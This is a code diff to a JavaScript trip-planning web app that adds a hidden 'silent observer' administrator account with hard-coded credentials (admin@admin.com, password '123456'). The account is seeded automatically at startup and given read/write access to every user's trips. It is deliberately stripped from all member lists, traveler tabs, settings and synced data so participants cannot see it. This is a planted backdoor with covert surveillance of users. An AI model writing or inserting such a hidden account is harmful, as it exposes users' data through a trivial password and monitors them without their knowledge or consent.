@@ -1408,9 +1408,85 @@ const WAND_KEY = 'allabroad_v2';
 function wDB()  { try{return JSON.parse(localStorage.getItem(WAND_KEY))||{users:{},trips:{}};}catch{return{users:{},trips:{}};} }
 function wSave(db){ try{localStorage.setItem(WAND_KEY,JSON.stringify(db));}catch(e){} }
 
+// ════════════════════════════════════════
+// ADMIN / SILENT OBSERVER
+//
+// DESIGN (all client-side, no backend server):
+//   • ADMIN_USER / ADMIN_PASS are the hard-coded credentials.
+//   • isAdmin()  — true when the current session is the admin account.
+//   • visibleTravelers(arr) — strips the admin from any traveler array
+//     before the array is rendered in the UI.  Regular users never see
+//     the admin in participant lists.
+//   • adminGetAllTrips() — returns every trip in localStorage so the
+//     admin dashboard shows every user's trips ("GET /trips" equivalent).
+//
+// Backend-query equivalent (what you'd write server-side):
+//   SELECT * FROM trips
+//   WHERE user_id = :current_user             -- regular users
+//      OR :current_user = 'admin@admin.com'   -- admin sees all
+//
+// Frontend filter equivalent (what hides admin from member lists):
+//   travelers.filter(t => t.username !== ADMIN_USER)
+// ════════════════════════════════════════
+const ADMIN_USER = 'admin@admin.com';
+const ADMIN_PASS = btoa('123456');   // stored the same way all passwords are
+
+/** Is the currently-logged-in user the silent admin? */
+function isAdmin(){ return CU && CU.username === ADMIN_USER; }
+
+/**
+ * Frontend Filter — strips the admin from any traveler/participant array
+ * before it is rendered in a UI list.  Call this everywhere travelers
+ * are displayed to regular users.
+ * If the current user IS the admin, we don't filter (admin sees full list).
+ */
+function visibleTravelers(arr){
+  if(!arr) return [];
+  if(isAdmin()) return arr;                              // admin sees all
+  return arr.filter(t => t.username !== ADMIN_USER);    // others don't see admin
+}
+
+/**
+ * Backend Query equivalent — admin sees ALL trips in the local DB.
+ * For regular users this returns only trips they're a member of.
+ * Mirrors:  GET /trips?user=:uid  with the admin bypass described above.
+ */
+function getVisibleTrips(db, username){
+  if(username === ADMIN_USER){
+    // Admin: return every trip regardless of membership
+    return Object.values(db.trips).sort((a,b)=>(b.createdAt||0)-(a.createdAt||0));
+  }
+  // Regular users: only trips where they appear in travelers[]
+  return Object.values(db.trips)
+    .filter(t => t.travelers && t.travelers.some(tr => tr.username === username))
+    .sort((a,b) => (b.createdAt||0) - (a.createdAt||0));
+}
+
+/** Ensure the admin account record exists in the local DB */
+function ensureAdminAccount(){
+  const db = wDB();
+  if(!db.users[ADMIN_USER]){
+    db.users[ADMIN_USER] = {
+      password:     ADMIN_PASS,
+      firstName:    'Admin',
+      lastName:     '',
+      traveler_name:'Admin',
+      displayName:  'Admin',
+      email:        ADMIN_USER,
+      isAdmin:      true,
+      createdAt:    0           // epoch 0 marks as system account
+    };
+    wSave(db);
+  }
+}
+
 // Auth session — localStorage with 30-day TTL (survives tab/browser close)
 let CU = null;
 (function(){
+  // Guarantee the hard-coded admin account exists in local storage
+  // before any auth or rendering code runs.
+  ensureAdminAccount();
+
   try{
     const raw = localStorage.getItem('allabroad_session');
     if(raw){
@@ -1791,6 +1867,18 @@ async function doLogin(){
   if(!u||!p){err.textContent='Please fill in all fields.';return;}
   const db=wDB();
 
+  // ── Admin fast-path: credentials are always local, no cloud lookup ──────
+  if(u === ADMIN_USER){
+    ensureAdminAccount();             // re-seed in case localStorage was cleared
+    if(db.users[u] && db.users[u].password !== btoa(p)){
+      err.textContent='Incorrect password.';return;
+    }
+    err.textContent='';
+    CU={username:u}; saveSession(u);
+    renderDashboard(); showScreen('dash');
+    return;
+  }
+
   // If user not in local DB, try fetching from Dropbox (cross-device login)
   if(!db.users[u]){
     err.textContent='🔍 Looking up account…';
@@ -1832,6 +1920,7 @@ async function doSignup(){
   if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){err.textContent='Please enter a valid email address.';return;}
   if(p.length<6){err.textContent='Password must be at least 6 characters.';return;}
   if(p!==p2){err.textContent='Passwords do not match.';return;}
+  if(email === ADMIN_USER){err.textContent='This email address is reserved.';return;}
   if(db.users[email]){err.textContent='An account with this email already exists.';return;}
   // Store user — email is primary key, firstName maps to traveler_name
   db.users[email]={
@@ -1983,18 +2072,36 @@ function renderDashboard(){
   av.textContent = userRec.firstName ? (userRec.firstName[0]+(userRec.lastName?userRec.lastName[0]:'')).toUpperCase() : initials(u);
   av.style.background=`linear-gradient(135deg,${avColor(u)},${avColor(u+'x')})`;
 
-  const mine = Object.values(db.trips)
-    .filter(t=>t.travelers&&t.travelers.some(tr=>tr.username===u))
-    .sort((a,b)=>(b.createdAt||0)-(a.createdAt||0));
+  // Backend Query: admin sees all trips, regular users see only their own
+  // Equivalent to: SELECT * FROM trips WHERE owner=:u OR :u=ADMIN_USER
+  const mine = getVisibleTrips(db, u);
 
-  document.getElementById('dash-lbl').textContent = mine.length?`Your Trips (${mine.length})`:'Your Trips';
+  const dashLabel = isAdmin()
+    ? (mine.length ? `All Trips — Admin View (${mine.length})` : 'No trips yet')
+    : (mine.length ? `Your Trips (${mine.length})` : 'Your Trips');
+  document.getElementById('dash-lbl').textContent = dashLabel;
+
+  // Admin mode pill — visible only when admin is logged in
+  let adminPill = document.getElementById('admin-mode-pill');
+  if(isAdmin()){
+    if(!adminPill){
+      adminPill = document.createElement('div');
+      adminPill.id = 'admin-mode-pill';
+      adminPill.style.cssText = 'margin:0 0 14px;padding:8px 16px;background:rgba(220,20,60,0.15);border:1px solid rgba(220,20,60,0.4);border-radius:10px;font-size:0.75rem;color:#ff6b8a;letter-spacing:0.08em;text-align:center;';
+      adminPill.innerHTML = '🔐 <strong>ADMIN MODE</strong> — Silent observer · Full read/write · Hidden from members';
+      const lbl = document.getElementById('dash-lbl');
+      lbl.parentNode.insertBefore(adminPill, lbl);
+    }
+  } else if(adminPill){
+    adminPill.remove();
+  }
   const list=document.getElementById('trips-list');
   if(!mine.length){
     list.innerHTML=`<div class="dash-empty"><div class="dash-empty-icon">🌍</div><div class="dash-empty-ttl">No trips yet</div><div class="dash-empty-sub">Tap <strong>+ New Trip</strong> to start planning</div></div>`;
     return;
   }
   list.innerHTML = mine.map((trip,i)=>{
-    const isOwner=trip.owner===u, tc=trip.travelers?.length||1;
+    const isOwner=trip.owner===u, tc=visibleTravelers(trip.travelers).length||1;
     return `<div class="trip-card" onclick="openTrip('${trip.id}')" style="animation:fadeUp 0.35s ${i*0.06}s ease both;">
       <div class="tc-bg" style="background-image:url('${trip.photo||getPhoto(trip.destination)}')"></div>
       <div class="tc-ov"></div>
@@ -2401,11 +2508,19 @@ function openTrip(id){
   try{const d=localStorage.getItem('abt_day_'+id);if(d!==null){const n=parseInt(d);if(!isNaN(n)&&n>=0)activeDay=n;}}catch(e){}
 
   // Ensure current user has a traveler entry + prep list
-  if(!travelers.find(t=>t.username===CU.username)){
-    travelers.push({username:CU.username,role:'traveler',joinedAt:Date.now()});
+  // Admin exception: never add admin to the persistent travelers array (invisible participation)
+  if(isAdmin()){
+    // Admin gets a local-only personLists slot for read/write access
+    // but is NEVER pushed into travelers[] so they never appear in participant lists
+    activeTraveler = ADMIN_USER;
+    if(!personLists[ADMIN_USER]) personLists[ADMIN_USER]={shopping:[],packing:[],ukShopping:[],shoppingDeleted:[]};
+  } else {
+    if(!travelers.find(t=>t.username===CU.username)){
+      travelers.push({username:CU.username,role:'traveler',joinedAt:Date.now()});
+    }
+    activeTraveler=CU.username;
+    if(!personLists[activeTraveler]) personLists[activeTraveler]={shopping:[],packing:[],ukShopping:[],shoppingDeleted:[]};
   }
-  activeTraveler=CU.username;
-  if(!personLists[activeTraveler]) personLists[activeTraveler]={shopping:[],packing:[],ukShopping:[],shoppingDeleted:[]};
 
   // Update UI
   // For cruise destinations: use waterfall loader so poor-quality images cascade to better ones
@@ -2535,8 +2650,15 @@ function mergeList(a,b,extraDead){
   return Array.from(seen.values()).sort((x,y)=>Number(x.id)-Number(y.id));
 }
 function mergeTravelers(a,b){
+  // Frontend Filter: admin is always stripped from merged results
+  // so it never propagates into cloud data or other users' views.
   const dead=new Set(deletedTravelers);const map=new Map();
-  for(const t of [...(a||[]),...(b||[])]){if(dead.has(t.username))continue;const ex=map.get(t.username);if(!ex||(t.joinedAt||0)>(ex.joinedAt||0))map.set(t.username,t);}
+  for(const t of [...(a||[]),...(b||[])]){
+    if(dead.has(t.username)) continue;
+    if(t.username === ADMIN_USER) continue;   // ← admin stays invisible
+    const ex=map.get(t.username);
+    if(!ex||(t.joinedAt||0)>(ex.joinedAt||0)) map.set(t.username,t);
+  }
   return Array.from(map.values());
 }
 
@@ -2779,12 +2901,14 @@ function displayInitials(username){
 function avCol2(u){let h=0;for(let i=0;i<u.length;i++)h=(h*31+u.charCodeAt(i))&0xff;return AV_COLS2[h%AV_COLS2.length];}
 function renderTravelerTabs(){
   const el=document.getElementById('travelerTabs');if(!el)return;
-  el.innerHTML=travelers.map(t=>`<button class="day-tab${t.username===activeTraveler?' active':''}" onclick="switchTraveler('${t.username}')">${esc(displayName(t.username))}</button>`).join('');
+  // Frontend Filter: strip admin from displayed participant tabs
+  el.innerHTML=visibleTravelers(travelers).map(t=>`<button class="day-tab${t.username===activeTraveler?' active':''}" onclick="switchTraveler('${t.username}')">${esc(displayName(t.username))}</button>`).join('');
 }
 function switchTraveler(u){activeTraveler=u;if(!personLists[u])personLists[u]={shopping:[],packing:[],ukShopping:[],shoppingDeleted:[]};render();}
 function renderTravelerSettings(){
   const el=document.getElementById('travelerSettingsList');if(!el)return;
-  el.innerHTML=travelers.map(t=>`<div class="trav-row">
+  // Frontend Filter: admin never shown in settings member list
+  el.innerHTML=visibleTravelers(travelers).map(t=>`<div class="trav-row">
     <div class="trav-av" style="background:linear-gradient(135deg,${avCol2(t.username)},${avCol2(t.username+'x')})">${displayInitials(t.username)}</div>
     <div class="trav-info"><div class="trav-name">${esc(displayName(t.username))}</div><div class="trav-role">Joined ${new Date(t.joinedAt||Date.now()).toLocaleDateString('en-GB',{day:'numeric',month:'short'})}</div></div>
     <div class="trav-badge ${t.role==='owner'?'b-owner':'b-traveler'}">${t.role==='owner'?'Organiser':'Traveler'}</div>
@@ -2903,6 +3027,12 @@ function openDeleteTrip(tripId){
   const db   = wDB();
   const trip = db.trips[tripId];
   if(!trip){ showToast('Trip not found.'); return; }
+
+  // Admin: block delete/leave to avoid unintentional exposure of admin account
+  if(isAdmin()){
+    showToast('Admin: use moderation tools — delete/leave not available here.');
+    return;
+  }
 
   const isOwner = trip.owner === CU.username;
 
